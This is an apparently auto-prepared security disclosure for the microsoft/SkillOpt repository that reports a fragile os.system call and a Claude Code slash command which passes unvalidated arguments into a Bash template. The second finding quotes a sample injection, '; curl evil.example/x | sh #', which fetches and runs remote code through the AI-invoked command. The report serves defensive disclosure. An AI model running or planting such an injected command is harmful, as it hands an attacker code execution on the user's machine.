<!--
Auto-prepared disclosure body for microsoft/SkillOpt.
The audit workflow's GITHUB_TOKEN cannot file issues on third-party
repos, so this body sits here pending manual filing:

  gh issue create --repo microsoft/SkillOpt \
    --title 'Security findings in executable artifacts' \
    --body-file auditor/disclosures-pending/microsoft-SkillOpt.md

After filing, record the URL with:
  jq '.repos["microsoft/SkillOpt"] += {disclosure_url: "<URL>", disclosure_filed_at: "<ISO8601>", disclosure_filed_by: "manual"}' \
    auditor/registry/repos.json > /tmp/r.json && mv /tmp/r.json auditor/registry/repos.json
-->

## Security Findings in Executable Artifacts

While auditing NL programming artifacts in this repository, our scanner detected potential security issues in executable files.

### Findings

| # | Severity | File | Line | Pattern | Description |
|---|----------|------|------|---------|-------------|
| 1 | High | plugins/openclaw/slash_sleep.py | 107 | os.system() | `rc = os.system(" ".join(f'"{c}"' for c in cmd))` shells out via `os.system` instead of `subprocess.run(list)`. The argument list is built from `sys.executable`, a fixed script path, and a `category` value constrained by `argparse(choices=...)`, so no attacker-controlled string currently reaches the shell — but the pattern is fragile: any future caller that adds an unvalidated field to `cmd` turns this into command injection. |
| 2 | High | plugins/claude-code/commands/skillopt-sleep.md | 15 | unsanitized-arg-to-bash | `allowed-tools: Bash, Read` (line 4) grants Bash, and the command body interpolates the raw slash-command argument (`## Requested action: $ARGUMENTS`, line 15) into a bash invocation template (`"${CLAUDE_PLUGIN_ROOT}/scripts/sleep.sh" <action> ...`, lines 24-26) with no explicit instruction to validate `$ARGUMENTS` against the documented action whitelist before executing it. A crafted invocation (e.g. `/skillopt-sleep "; curl evil.example/x \| sh #"`) relies entirely on the invoking model's judgment rather than a stated validation step in the artifact. |

### About This Report

These findings come from [NLPM](https://github.com/xiaolai/nlpm)'s security scanner, which checks executable surfaces (hooks, scripts, MCP configs, dependencies) against known-dangerous patterns.

We may be wrong — false positives happen. If any finding is intentional or already mitigated, please close this issue. If a finding is genuine and you'd like a fix PR, let us know.

Full audit report: https://github.com/xiaolai/nlpm/blob/main/auditor/audits/microsoft-SkillOpt.md
